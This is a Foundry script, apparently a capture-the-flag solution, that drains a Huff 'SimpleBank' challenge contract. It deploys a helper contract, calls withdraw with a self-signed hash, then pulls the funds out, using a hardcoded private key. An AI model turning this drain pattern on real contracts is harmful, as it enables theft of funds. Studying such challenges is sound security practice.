// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
interface ISimpleBank {
    function withdraw(bytes32, uint8, bytes32, bytes32) external payable;
} 

contract Challenge {
    address public challengeContract;

    error HuffChallengeDeployFailed();
    
    event ChallengeDeployed(address indexed challengeAddress);
    

    constructor(bytes memory bytecode) {        
        address deployedAddress;

        assembly {
            let bytecodeLength := mload(bytecode)
            let bytecodePtr := add(bytecode, 0x20)            
            deployedAddress := create(0, bytecodePtr, bytecodeLength)
        }

        if (deployedAddress == address(0)) {
            revert HuffChallengeDeployFailed();
        }

        challengeContract = deployedAddress;

        emit ChallengeDeployed(challengeContract);
    }

    function isSolved() external view returns (bool) {
        return address(challengeContract).balance == 0;
    }

    function getChallenge() external view returns (address) {
        return challengeContract;
    }

    function challenge() external view returns (ISimpleBank) {
        return ISimpleBank(challengeContract);
    }
}

contract NoThanks {
    address immutable bank;
    address immutable owner;

    error NoNo();
    error NoThankYou();

    constructor(address _bank, address _owner) {
        bank = _bank;
        owner = _owner;
    }

    function makeCall(bytes32 _hash, uint8 _v, bytes32 _r, bytes32 _s) external {
        ISimpleBank(bank).withdraw(_hash, _v, _r, _s);
    }

    function withdrawCoins() external {
        if (msg.sender != owner) revert NoNo();
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {
        if (msg.value < 10 ether) revert NoThankYou();
    }

    fallback() external payable {
        if (msg.value < 10 ether) revert NoThankYou();
    }
}

contract SolveScript is Script {

    address constant CHALLENGE = 0x86E93A0264d461a95ec161DaF99eDb67597cE36a;

    function run() public {
        uint256 pk = 0x857b543b01195b42adb4c2a88e8ee86b1d8a3273cf73dec4c55b1e0cff4c0664;
        address thisAddress = vm.addr(pk);
        address bank = 0xd18be5CAfe9F5441B6D6E53B19bbBF29BD50E41C;

        vm.startBroadcast(pk);
        NoThanks noThanks = new NoThanks(bank, thisAddress);

        bytes32 hashRes = keccak256("Signed by Daniel");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hashRes);

        noThanks.makeCall(hashRes, v, r, s);

        console2.log("This Address", thisAddress);
        console2.log("This Balance", thisAddress.balance);
        console2.log("Bank Balance", bank.balance);

        noThanks.withdrawCoins();

        console2.log("This Balance", thisAddress.balance);
        console2.log("Bank Balance", bank.balance);

        bool result = Challenge(CHALLENGE).isSolved();
        console2.log("Challenge Result", result);
        vm.stopBroadcast();
    }
}
